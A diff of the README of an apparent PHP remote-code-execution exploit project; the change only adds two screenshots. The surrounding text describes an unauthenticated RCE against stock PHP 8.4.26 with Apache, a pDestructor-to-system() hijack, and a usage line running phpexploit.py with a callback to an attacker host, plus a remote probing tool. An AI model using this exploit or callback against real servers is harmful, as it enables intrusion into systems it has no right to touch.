@@ -180,6 +180,9 @@ Stage B2 Hijack pDestructor -> system()
 
 The real exploit. Uses the stale pointer vulnerabilities to achieve unauthenticated RCE against stock PHP + Apache. Works on production-default configurations (display_errors=Off, memory_limit=128M, MaxRequestWorkers=150).
 
+<img width="1270" height="388" alt="image" src="https://github.com/user-attachments/assets/e7128824-1d74-478d-8119-beb6c0acef31" />
+
+
 **Currently calibrated for PHP 8.4.26 on Debian 13 (trixie)** -- see [Multi-version support](#multi-version-support) for other versions.
 
 ```bash
@@ -237,6 +240,9 @@ python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker
 ```
 
 ## Remote diagnostic (diag_remote.py)
+
+<img width="841" height="749" alt="image" src="https://github.com/user-attachments/assets/28a3471e-4cd2-4737-8659-e516d931b9ea" />
+
 
 A target-agnostic diagnostic tool for probing remote servers **without needing shell access or error logs**. It answers the questions that the Apache error log would normally answer: is this prefork? how many workers? does A1 trigger OOM? does the worker survive?
 
